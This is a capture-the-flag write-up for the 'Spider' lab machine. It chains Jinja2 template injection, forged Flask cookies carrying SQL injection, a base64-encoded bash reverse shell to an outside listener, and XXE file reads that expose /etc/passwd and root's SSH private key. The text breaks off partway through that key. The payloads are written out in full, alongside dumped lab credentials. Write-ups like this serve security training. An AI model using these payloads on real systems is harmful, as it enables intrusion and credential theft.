# Spider - SSTI - XXE Injection

+ # Index
   + [Enumeration](craftdocs://open?blockId=15CB59F5-EACE-42AF-BFE7-5E516B67CB89&spaceId=f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e)
   + [Initial Access](craftdocs://open?blockId=E15777D9-0F08-405F-AA82-96224A028CA1&spaceId=f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e)
   + [Privilege Escalation](craftdocs://open?blockId=4E8D344A-D7E3-46E2-A0C5-EFB04A394C00&spaceId=f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e)

# Synopsis

“Spider” is marked as hard difficulty machine that features Nginx hosting PHP pages of selling furnitures. Username field is vulnerable to SSTI, the server is running Jinja2 as template engine and flask as web framework. We read the flask configuration by exploiting SSTI and it has secret key for signing cookies. We use secret key to create custom cookie with SQL query which will give us access to admin. We pass this custom cookie to gain admin’s (chiv) session. We run SQLMap against the server with eval flag to dump the database, from DB we get UUID, username & password of admin, endpoint (web directory). The endpoint reveals that it is a support ticket system, the email field is vulnerable to SSTI. We take advantage of this to gain our initial access on the system. Port 8080 is bound to localhost, we forward that port to our Kali Machine, it is a beta login which allows any user to access without password. The logged in session cookies reveals that it is using LXML python library to handle HTML and XML files. This gives us an opportunity to exploit XXE injection to gain access to root’s SSH private key.

# Skills Required

- Web Enumeration
- Server Side Template Injection
- XXE Injection

# Skills Learned

- SSTI
- XXE Injection

# Enumeration

```shell
🔥\> nmap -p- -sV -sC -v -oA enum --min-rate 4500 --max-rtt-timeout 1500ms --open spider.htb
Nmap scan report for spider.htb (10.10.10.243)
Host is up (0.17s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 28:f1:61:28:01:63:29:6d:c5:03:6d:a9:f0:b0:66:61 (RSA)
|   256 3a:15:8c:cc:66:f4:9d:cb:ed:8a:1f:f9:d7:ab:d1:cc (ECDSA)
|_  256 a6:d4:0c:8e:5b:aa:3f:93:74:d6:a8:08:c9:52:39:09 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: F732B9BF02F87844395C3A78B6180A7E
| http-methods:
|_  Supported Methods: POST HEAD GET OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to Zeta Furniture.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nmap reveals only two ports are open on the machine, SSH and HTTP. Let’s access the access the website.

![Screen Shot 2021-06-02 at 00.45.15.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8AD334C8-BFCD-4AA8-9412-E72695E555A0/3A5D4A9F-24A6-498F-8A92-77937C44FCFE_2/Screen%20Shot%202021-06-02%20at%2000.45.15.png)

There are couple options on the left to register and login. Let’s do a directory Bruteforce to find any hidden pages/directories.

```shell
🔥\> gobuster dir -u http://spider.htb -x php -b 403,404 -w ~/tools/SecLists/Discovery/Web-Content/raft-small-words.txt -o gobust
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://spider.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/tools/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/06/02 00:16:59 Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 1832]
/index                (Status: 200) [Size: 11273]
/register             (Status: 200) [Size: 2130]
/user                 (Status: 302) [Size: 219] [--> http://spider.htb/login]
/logout               (Status: 302) [Size: 209] [--> http://spider.htb/]
/cart                 (Status: 500) [Size: 290]
/checkout             (Status: 500) [Size: 290]
/view                 (Status: 302) [Size: 219] [--> http://spider.htb/login]
/main                 (Status: 302) [Size: 219] [--> http://spider.htb/login]
/product-details      (Status: 308) [Size: 275] [--> http://spider.htb/product-details/]
```

There’s nothing new information from the gobuster. Let’s register ourselves and capture the request in burp suite.

![Screen Shot 2021-06-02 at 00.52.17.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8AD334C8-BFCD-4AA8-9412-E72695E555A0/4D454A99-6A40-4C36-97C3-C249D8186644_2/Screen%20Shot%202021-06-02%20at%2000.52.17.png)

The response from the server is redirecting to UUID.

![Screen Shot 2021-06-02 at 00.53.37.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8AD334C8-BFCD-4AA8-9412-E72695E555A0/A809D89A-555E-4095-84F4-DFC765EA00C4_2/Screen%20Shot%202021-06-02%20at%2000.53.37.png)

Perhaps we can try SSTI in username. Let’s register once again, but this time we will use a payload {{7+7}} to identify the vulnerability.

![Screen Shot 2021-06-02 at 03.33.13.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8AD334C8-BFCD-4AA8-9412-E72695E555A0/7D96CB4A-188E-4CEC-A661-95DDDE071937_2/Screen%20Shot%202021-06-02%20at%2003.33.13.png)

After registering, login using the same credentials and visit the /user path to check the vulnerability.

![Screen Shot 2021-06-02 at 04.00.28.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8AD334C8-BFCD-4AA8-9412-E72695E555A0/75EDF2A0-35C3-4361-A330-C16BB88E2DA8_2/Screen%20Shot%202021-06-02%20at%2004.00.28.png)

As you can see, the username is 14 that’s because we used a payload to add the numbers. The username field is limited to 10 characters, so we can input a payload to get the reverse shell.

![Screen Shot 2021-06-02 at 04.03.16.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8AD334C8-BFCD-4AA8-9412-E72695E555A0/BA471AE3-633B-44CE-B38C-D2CCF6225BF8_2/Screen%20Shot%202021-06-02%20at%2004.03.16.png)

Let’s find the which template engine is being run on the machine. To identify we will use {{7*’7’}}, if ‘Twig’ is running then the result would be 49, if Jinja2 is running then the result would be 7777777.

![Screen Shot 2021-06-02 at 23.00.45.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8AD334C8-BFCD-4AA8-9412-E72695E555A0/28FBE74A-43B5-4917-80C4-9C40AA6108AA_2/Screen%20Shot%202021-06-02%20at%2023.00.45.png)

As you can see, the result is 7777777, so Jinja2 is running as template engine. Let’s read the configuration file with {{config}} to read the variables.

![Screen Shot 2021-06-02 at 04.06.20.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8AD334C8-BFCD-4AA8-9412-E72695E555A0/4FD62EBC-21DF-4ABC-8135-C0C77A7B4C04_2/Screen%20Shot%202021-06-02%20at%2004.06.20.png)

The configuration is username field, but it’s quite long so we need to view the page source.

```html
<input type="text" name="username" readonly value="&lt;Config {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: &#39;Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: datetime.timedelta(0, 43200), &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application/json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093, &#39;RATELIMIT_ENABLED&#39;: True, &#39;RATELIMIT_DEFAULTS_PER_METHOD&#39;: False, &#39;RATELIMIT_SWALLOW_ERRORS&#39;: False, &#39;RATELIMIT_HEADERS_ENABLED&#39;: False, &#39;RATELIMIT_STORAGE_URL&#39;: &#39;memory://&#39;, &#39;RATELIMIT_STRATEGY&#39;: &#39;fixed-window&#39;, &#39;RATELIMIT_HEADER_RESET&#39;: &#39;X-RateLimit-Reset&#39;, &#39;RATELIMIT_HEADER_REMAINING&#39;: &#39;X-RateLimit-Remaining&#39;, &#39;RATELIMIT_HEADER_LIMIT&#39;: &#39;X-RateLimit-Limit&#39;, &#39;RATELIMIT_HEADER_RETRY_AFTER&#39;: &#39;Retry-After&#39;, &#39;UPLOAD_FOLDER&#39;: &#39;static/uploads&#39;}&gt;" />
```

From this configuration we get the secret_key value. If it’s Jinja2 then the ‘Flask’ web application framework must be running in parallel. Let’s confirm by decoding the cookies.

```shell
🔥\> flask-unsign -d -c eyJjYXJ0X2l0ZW1zIjpbXSwidXVpZCI6Ijk1MjlkNzRmLWQwNTEtNDRhMC04M2I0LWI3MWZmODcwMzI4YyJ9.YLhyyQ.tDNrLRGFoBeGsjHs7m2gP7_zcMA
{'cart_items': [], 'uuid': '9529d74f-d051-44a0-83b4-b71ff870328c'}
```

As you can see we successfully decoded the cookies with python module called ‘flask-unsign’ by providing the cookies of current user.

> So far we have identified that Flask framework is running with Jinja2 as template engine. It is vulnerable to SSTI and we have the secret_key value. Now we can modify the session cookies because we have the secret_key.

Let’s generate new cookies with secret_key, but we don’t know whether admin or another user exists or not. So, we have to perform a SQL injection via cookie value.

```shell
🔥\> flask-unsign --sign --cookie "{'cart_items': [], 'uuid': '\'or 1=1 #'}" --secret "Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942"
eyJjYXJ0X2l0ZW1zIjpbXSwidXVpZCI6IidvciAxPTEgIyJ9.YLiy4A.MZdsM3B4vX21sivpDjKT4yJEM0M
```

We got the signed cookies with SQL query. Under UUID we are passing the SQL query ( ‘or 1=1). Now we use this signed cookie and update via cookie-editor and refresh the page.

![Screen Shot 2021-06-03 at 03.50.36.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8AD334C8-BFCD-4AA8-9412-E72695E555A0/5FF1F26B-58B7-4B92-9179-2EA1A3046312_2/Screen%20Shot%202021-06-03%20at%2003.50.36.png)

![Screen Shot 2021-06-03 at 03.50.55.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8AD334C8-BFCD-4AA8-9412-E72695E555A0/00E6783F-77D3-42F5-9066-F44642DAB252_2/Screen%20Shot%202021-06-03%20at%2003.50.55.png)

As you can see, after adding custom cookie we got another user session now (chiv). There’s nothing new which can help us to gain shell. Let’s perform a SQL injection and dump the database for passwords.

```shell
🔥\> sqlmap http://spider.htb/ --eval "from flask_unsign import session as s; session = s.sign({'uuid': session}, secret='Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942')" --cookie="session=*" --dump
```

We are using eval function to generate cookies for every request SQLMAP makes to the server for enumeration and all. If we give only custom cookie it gives us an error. The previously gathered information about configuration of Flask Framework revealed that the session cookies will change upon each request is set true.

```other
SESSION_REFRESH_EACH_REQUEST&#39;: True,
```

For the dump, there are two things we gathered.

```shell
🔥\> cat ~/.local/share/sqlmap/output/spider.htb/
dump/           log             session.sqlite  target.txt

🔥\> cat ~/.local/share/sqlmap/output/spider.htb/dump/shop/
items.csv             message-34491011.bin  messages.csv          support.csv           users.csv

🔥\> cat ~/.local/share/sqlmap/output/spider.htb/dump/shop/messages.csv
post_id,creator,message,timestamp
1,1,Fix the <b>/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal</b> portal!,2020-04-24 15:02:41
2,1,asfsaf,2021-06-03 09:08:41

🔥\> cat ~/.local/share/sqlmap/output/spider.htb/dump/shop/users.csv
id,uuid,name,password
1,129f60ea-30cf-4065-afb9-6be45ad38b73,chiv,ch1VW4sHERE7331
2,9529d74f-d051-44a0-83b4-b71ff870328c,{{7*'7'}},password
3,f6dac3d2-f248-4ff9-905b-12499cc7f992,ben,sdfghjkl
4,10db30e4-ff3f-498c-b1e9-03cac41f0182,chiv,sdfghjkl
5,19e5d240-d524-4664-ab19-31d610c6b179,{{config}},password
6,856967b5-09fe-4e23-a74a-d3634bbb770d,{{7*7}},sdfghjkl
7,0c9c0065-5b40-4540-b89d-5663053b44a1,{{7*7}},sdfghjkl
8,9141b4b0-c1f7-4b0e-82f5-4ab7ea4e2586,{{7*7}},sdfghjkl
9,6cf7ec8d-bce9-4232-bf0b-cf5b1d04771d,{{7*7}},sdfghjkl
10,143bbdd6-2763-471c-8a61-6998471235ca,{{config}},sdfghjkl
11,663c3cd2-cfd0-4a27-835e-b342a330744c,test,test
```

We got a message saying to fix something from the directory (portal) and user credentials. Let’s try user credentials first.

![Screen Shot 2021-06-03 at 04.25.43.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8AD334C8-BFCD-4AA8-9412-E72695E555A0/D184C8E1-BA79-4BA5-8B6F-F58A307E30B6_2/Screen%20Shot%202021-06-03%20at%2004.25.43.png)

We use the first user’s (chiv) credentials to login.

![Screen Shot 2021-06-03 at 04.26.35.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8AD334C8-BFCD-4AA8-9412-E72695E555A0/CCF386F5-4D28-4480-B373-1EB9666948DC_2/Screen%20Shot%202021-06-03%20at%2004.26.35.png)

Upon login we get this welcome page and with other messaging options. So, chiv user is admin of this website. Let’s read messages.

![Screen Shot 2021-06-03 at 04.29.35.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8AD334C8-BFCD-4AA8-9412-E72695E555A0/9E255FAC-1838-4312-B980-0B953708B33F_2/Screen%20Shot%202021-06-03%20at%2004.29.35.png)

We already have this message from DB dump. Let’s access this portal.

![Screen Shot 2021-06-03 at 04.31.24.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8AD334C8-BFCD-4AA8-9412-E72695E555A0/C6B06E75-E371-4F5B-B4EF-7B18A6D2DE6D_2/Screen%20Shot%202021-06-03%20at%2004.31.24.png)

Ticketing system. Let’s try SSTI here.

![Screen Shot 2021-06-03 at 04.32.47.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8AD334C8-BFCD-4AA8-9412-E72695E555A0/723CF8F3-4F0A-4A84-A629-D5E7FBA67193_2/Screen%20Shot%202021-06-03%20at%2004.32.47.png)

![Screen Shot 2021-06-03 at 04.33.02.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8AD334C8-BFCD-4AA8-9412-E72695E555A0/DAB3B299-F081-4639-8738-F8157755C532_2/Screen%20Shot%202021-06-03%20at%2004.33.02.png)

After submitting the basic injection payload, we got this error. Sever/application is blocking ‘{‘ character with many other. Let’s try to bypass that and gain shell access.

# Initial Access

First we need to encode our bash one-liner with base64.

```shell
🔥\> echo -n "bash -i >& /dev/tcp/10.10.14.106/1234 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMDYvMTIzNCAwPiYx
```

Now we append this encoded one-liner into our payload.

[SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-remote-code-execution)

```python
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43OS85MDAxIDA+JjE= | base64 -d | bash")["read"]() %} a {% endwith %}
```

Setup a Pwncat/Netcat listener.

```shell
🔥\> pwncat -l -p 1234
bound to 0.0.0.0:1234
```

Submit the payload in contact field.

![Screen Shot 2021-06-03 at 22.50.09.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8AD334C8-BFCD-4AA8-9412-E72695E555A0/B54ABC2F-17B5-4A0C-BE47-15564A28EDF2_2/Screen%20Shot%202021-06-03%20at%2022.50.09.png)

Check Pwncat/Netcat listener and read the user flag.

```other
🔥\> pwncat -l -p 1234
[22:50:40] received connection from 10.10.10.243:52358                                                   connect.py:255

[22:50:42] new host w/ hash 647fe56913a903a3ee8289ba67d033d4                                              victim.py:321
[22:50:50] pwncat running in /bin/bash                                                                    victim.py:354
[22:50:55] pwncat is ready 🐈                                                                             victim.py:771

(remote) chiv@spider:/$ id
uid=1000(chiv) gid=33(www-data) groups=33(www-data)

(remote) chiv@spider:/$ cat /home/chiv/user.txt
118a5081f8d49e7b1f8244f562fec1c2
```

# Privilege Escalation

LinPeas result didn’t show any escalation path to gain root shell. However, port 8080 is bound to localhost. Let’s forward that port to our Kali Linux machine and enumerate.

For this we can use SSH to forward the port, but I will use Chisel application. We need to start a Chisel server first on Kali Linux and Chisel client on target machine.

On Kali Linux

```shell
🔥\> ./chisel server -p 9999 --reverse
2021/06/03 23:06:22 server: Reverse tunnelling enabled
2021/06/03 23:06:22 server: Fingerprint OZyBWgnDeTNqEv/nh26JwQHZj5GSpBkZy9LGUqfO7Zg=
2021/06/03 23:06:22 server: Listening on http://0.0.0.0:9999
```

On Target Machine

```shell
(remote) chiv@spider:/home/chiv$ ./chisel client 10.10.14.106:9999 R:8081:127.0.0.1:8080
2021/06/04 06:19:46 client: Connecting to ws://10.10.14.106:9999
2021/06/04 06:19:47 client: Connected (Latency 162.346554ms)
```

I forwarded target machine local port 8080 to Kali Linux machine on port 8081. Let’s access 8081 (8080) via web browser.

![Screen Shot 2021-06-03 at 23.09.13.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8AD334C8-BFCD-4AA8-9412-E72695E555A0/1FA93719-1795-4AAE-9A7B-0590A3965935_2/Screen%20Shot%202021-06-03%20at%2023.09.13.png)

We have a login page for beta, use any username to login.

![Screen Shot 2021-06-03 at 23.10.29.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8AD334C8-BFCD-4AA8-9412-E72695E555A0/F2F9DA96-CE3A-4783-810D-C3523A565572_2/Screen%20Shot%202021-06-03%20at%2023.10.29.png)

Everything is static, other than logout button. Let’s copy the user cookie and try to decode it.

```shell
🔥\> flask-unsign -d -c .eJxNjMtugzAUBX-l8roLoDQLpGyQH9QpRDbYl3gHclQIj6JgtYQo_95GaqQuRzPnXFG_DD2KruipRhFSJKOWLIXouJbgRj34cIT0UiemrRQNCzbFVvlYlDLVWL4r0uzs8Laq3OFfP-Yqi_d0SuQpNnd_Z-P1WIDlwiOhoc2-ZpnLoGm1r87QWbCMb-yL6YC8zofA8yvGS_3v728vZLBsAHNWBbysEy2qjoQF5vOx_7jIwbU6WHzF7NejF2t_Bt3kFY3Hem3S1JuCwymTu-_tFt2e0fTZjm5GkXf7AXg2VbY.YLnHlw.mO1qbhl6eiBX0Gf_SE_32eR6FSs
{'lxml': b'PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+ZGVtbzwvdXNlcm5hbWU+CiAgICAgICAgPGlzX2FkbWluPjA8L2lzX2FkbWluPgogICAgPC9kYXRhPgo8L3Jvb3Q+', 'points': 0}
```

The result has two important things. First, the server is using ‘LXML’ Python library which allows for easy handling of XML and HTML files. Second, the base64 encoded data which reveals the API version of XML.

```shell
🔥\> echo -n PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+ZGVtbzwvdXNlcm5hbWU+CiAgICAgICAgPGlzX2FkbWluPjA8L2lzX2FkbWluPgogICAgPC9kYXRhPgo8L3Jvb3Q+ | base64 -d
<!-- API Version 1.0.0 -->
<root>
    <data>
        <username>demo</username>
        <is_admin>0</is_admin>
    </data>
</root>
```

There is a possibility of XML External Entity (XXE) Injection.

> XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.

Let’s intercept the login and add the payload.

```xml
username=%26demo_user%3b&version=1.0.0--><!DOCTYPE+foo+[<!ENTITY+demo_user+SYSTEM+"http://10.10.14.106">+]><!--
```

![Screen Shot 2021-10-09 at 07.35.02.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8AD334C8-BFCD-4AA8-9412-E72695E555A0/3D472087-86B3-4EE9-9EC0-AA5652B2FE54_2/Screen%20Shot%202021-10-09%20at%2007.35.02.png)

Make sure to encode the special characters. Check below image.

![Screen Shot 2021-10-09 at 07.36.14.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8AD334C8-BFCD-4AA8-9412-E72695E555A0/B18DE950-07EF-414C-B860-71B232F2B0E6_2/Screen%20Shot%202021-10-09%20at%2007.36.14.png)

In this payload we can’t inject in username field, so we call the external entity via version field and try to hit our server. If it works then we can read files and SSH keys.

Run netcat listener on port 80 and forward the request to server from burp suite.

```shell
🔥\> nc -lvnp 80
listening on [any] 80 ...
```

Once you forward the request to server it gives you response with signed cookies and it will redirect it to requested session.

![Screen Shot 2021-06-04 at 01.13.42.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8AD334C8-BFCD-4AA8-9412-E72695E555A0/54344B7B-A264-458E-B5AC-652DDCB42C51_2/Screen%20Shot%202021-06-04%20at%2001.13.42.png)

Let’s decode the session cookies.

```other
🔥\> flask-unsign -d -c .eJxFjsFuozAURX9lxHoWmJJKjZTFUGwIlZ0x-NngHciRnPhBmCnSpFT996HddHl1dc-57xHeR4z279GPIdpHQAVz9K5kqHRtlkmPxJwNfxtKe-mBpaqYMwck52Ut-8ndIMCuZrYYGGsgrpbuekwtcY8u8Y1WWgOxjQlYwni_6BVHy_xpKMQssW512GlA-GdjXPo8Cw2liSpDeqYkF6UXcq1TFXi8ZWoMyh6qAMX80G__eOE4rL_-ymROz-b4dlKZtMnT1IDILMk2nw91DFuP2cbPpXGVjNkE1Jszzl0zaatX9goF9j2ZW97ajhP7aNBXgmT5SbErR7vrRlI4NoOgy9f-i__JU94buhuNdo0rWCueF1GXLum0P1nEFqba61V--5XnHKubpY69xOKPe7DXQWFiqYx_y8Mh-vgZzbfLtLxG-_jjP6FIhSg.YLnioQ.OXlvxUfR3iWtvtgeBD0f1nV70iQ
{'lxml': b'PCEtLSBBUEkgVmVyc2lvbiAxLjAuMC0tPjwhRE9DVFlQRSBmb28gWzwhRU5USVRZIGRlbW9fdXNlciBTWVNURU0gImh0dHA6Ly8xMC4xMC4xNC4xMDYiPiBdPjwhLS0gLS0+Cjxyb290PgogICAgPGRhdGE+CiAgICAgICAgPHVzZXJuYW1lPiZkZW1vX3VzZXI7PC91c2VybmFtZT4KICAgICAgICA8aXNfYWRtaW4+MDwvaXNfYWRtaW4+CiAgICA8L2RhdGE+Cjwvcm9vdD4=', 'points': 0}

🔥\> echo -n PCEtLSBBUEkgVmVyc2lvbiAxLjAuMC0tPjwhRE9DVFlQRSBmb28gWzwhRU5USVRZIGRlbW9fdXNlciBTWVNURU0gImh0dHA6Ly8xMC4xMC4xNC4xMDYiPiBdPjwhLS0gLS0+Cjxyb290PgogICAgPGRhdGE+CiAgICAgICAgPHVzZXJuYW1lPiZkZW1vX3VzZXI7PC91c2VybmFtZT4KICAgICAgICA8aXNfYWRtaW4+MDwvaXNfYWRtaW4+CiAgICA8L2RhdGE+Cjwvcm9vdD4= | base64 -d
<!-- API Version 1.0.0--><!DOCTYPE foo [<!ENTITY demo_user SYSTEM "http://10.10.14.106"> ]><!-- -->
<root>
    <data>
        <username>&demo_user;</username>
        <is_admin>0</is_admin>
    </data>
</root>
```

As you can see our injection is in version field. Once we forward it to server (2nd time), it gets parsed and we get a HTTP hit on our netcat listener. Let’s forward that second request and check our listener.

![Screen Shot 2021-06-04 at 01.17.20.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8AD334C8-BFCD-4AA8-9412-E72695E555A0/C60051C8-D5FE-4BCD-A9A2-8BBC7CD4080E_2/Screen%20Shot%202021-06-04%20at%2001.17.20.png)

Check Netcat listener.

```shell
🔥\> nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.14.106] from (UNKNOWN) [10.10.10.243] 36614
GET / HTTP/1.0
Host: 10.10.14.106
Accept-Encoding: gzip
```

As you can see got the hit on our port 80. Let’s read the passwd file with same technique.

![Screen Shot 2021-06-04 at 01.25.07.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8AD334C8-BFCD-4AA8-9412-E72695E555A0/8637991D-CDF1-4DB7-B2E1-6675AC8567ED_2/Screen%20Shot%202021-06-04%20at%2001.25.07.png)

This above request will read the passwd file. Check the browser and view page source.

```html
<div class="wrap cf">
    <h1 class="projTitle" id="welcome">Welcome, root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
chiv:x:1000:1000:chiv:/home/chiv:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
```

As you can see, we can able to read the local file. If we try to gain reverse shell via ‘expect://' wrapper it would not work and it gives you an error, I guess it is not enabled. So we have to read SSH keys of root.

![Screen Shot 2021-06-04 at 01.32.41.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/8AD334C8-BFCD-4AA8-9412-E72695E555A0/E39B2F57-E906-45A1-94AB-5391F2542F19_2/Screen%20Shot%202021-06-04%20at%2001.32.41.png)

Forward the request and check the browser.

```html
<div class="wrap cf">
    <h1 class="projTitle" id="welcome">Welcome, -----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAl/dn2XpJQuIw49CVNdAgdeO5WZ47tZDYZ+7tXD8Q5tfqmyxq
gsgQskHffuzjq8v/q4aBfm6lQSn47G8foq0gQ1DvuZkWFAATvTjliXuE7gLcItPt
iFtbg7RQV/xaTwAmdRfRLb7x63TG6mZDRkvFvGfihWqAnkuJNqoVJclgIXLuwUvk
4d3/Vo/MdEUb02ha7Rw9oHSYKR4pIgv4mDwxGGL+fwo6hFNCZ+YK96wMlJc3vo5Z
EgkdKXy3RnLKvtxjpIlfmAZGu0T+RX1GlmoPDqoDWRbWU+wdbES35vqxH0uM5WUh
vPt5ZDGiKID4Tft57udHxPiSD6YBhLT5ooHfFQIDAQABAoIBAFxB9Acg6Vc0kO/N
krhfyUUo4j7ZBHDfJbI7aFinZPBwRtq75VHOeexud2vMDxAeQfJ1Lyp9q8/a1mdb
sz4EkuCrQ05O9QthXJp0700+8t24WMLAHKW6qN1VW61+46iwc6iEtBZspNwIQjbN
